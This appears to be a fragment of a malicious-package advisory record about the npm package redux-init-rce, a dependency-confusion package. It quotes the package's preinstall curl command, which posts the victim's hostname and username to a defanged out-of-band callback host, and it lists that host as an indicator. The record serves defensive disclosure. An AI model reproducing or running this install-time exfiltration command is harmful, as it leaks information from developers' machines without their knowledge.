  "summary": "Malicious code in redux-init-rce (npm)",
  "details": "A dependency-confusion package whose preinstall lifecycle hook exfiltrates host reconnaissance on install. The hook runs: curl -X POST -d \"info=$(hostname) $(whoami)\" hxxp://d22bct11og85ukurvqe0fwmajus9fyr9j[.]oast[.]online, sending the victim's hostname and current username to a remote out-of-band (OAST/Interactsh-style) callback host. index.js is an empty module; the entire payload is the install-time POST. C2/exfil host: d22bct11og85ukurvqe0fwmajus9fyr9j[.]oast[.]online (HTTP POST).",
